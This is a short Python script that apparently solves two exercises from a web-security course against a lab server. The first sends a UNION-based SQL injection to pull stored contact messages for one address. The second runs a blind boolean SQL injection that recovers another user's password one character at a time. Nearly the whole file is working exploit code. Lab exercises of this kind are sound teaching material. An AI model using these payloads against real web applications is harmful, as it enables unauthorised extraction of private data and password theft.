import requests

MY_IP = "128.179.139.87"

# Exercise 1a

inject_id = "1' UNION SELECT mail, message FROM contact_messages WHERE mail='james@bond.mi5"

print("\033[1mExercise 1a:\033[0m")
# print("Injecting", inject_id)
r1 = requests.get("http://" + MY_IP + ":80/personalities", {'id': inject_id })

for line in r1.text.split('\n'):
  if "james@bond.mi5" in line:
    b = line.find(':') + 1
    e = line.find("</a>")
    print(line[b:e])

# Exercise 1b

print ("\033[1mExercise 1b:\033[0m")

POSSIBLE_CHARS = '0123456789abcdefghijklmnopqrstuvwxyz'

finished = False
pw = ''

while not finished:
  for c in POSSIBLE_CHARS:
    pas = pw + c
    inject_name = "hello' OR SUBSTRING((SELECT password FROM users WHERE users.name='inspector_derrick'), 1, " + str(len(pas)) + ") = '" + pas
    # print("Injecting", inject_name)
    print(pas, end='\r')
    r2 = requests.post("http://" + MY_IP + ":80/messages", data={"name": inject_name})
    if r2.text.find('internal error') != -1:
      print("ERROR...")
      finished = True
      break
    if r2.text.find('name exists') != -1:
      pw += c
      break
    if c == 'f':
      finished = True

print(pw + ' ')
